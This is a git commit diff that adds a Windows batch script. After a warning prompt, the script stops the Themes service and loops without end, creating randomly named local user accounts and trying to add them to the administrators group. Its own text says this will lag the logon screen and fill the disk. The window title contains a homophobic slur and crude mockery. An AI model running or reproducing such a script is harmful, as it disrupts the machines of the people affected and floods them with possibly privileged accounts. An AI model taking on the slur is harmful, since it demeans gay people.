db5f3014f35a99da99cb7e59c2dceaf501a30bbe
cleanremote <cleanremote@mailinator.com>
2017-05-07 18:30:24 -0500

    Add files via upload

---
+++ 2003ryans/therealway.cmd
@@ -0,0 +1,11 @@
+@echo off
+title I'm such a faggot... I'm going to make a bunch of users because FORKIES'D XDDXXDXDDXDXDXDX
+color 0a
+echo WARNING! THIS WILL LAG THE LOGON SCREEN AND WILL POTENTIALLY FILL THE HARD DISK!
+pause
+cls
+net stop themes
+:itbegins
+net user SHITHEAD%random% /add
+net localgroup administrators SHITHEAD%random% /add
+goto itbegins
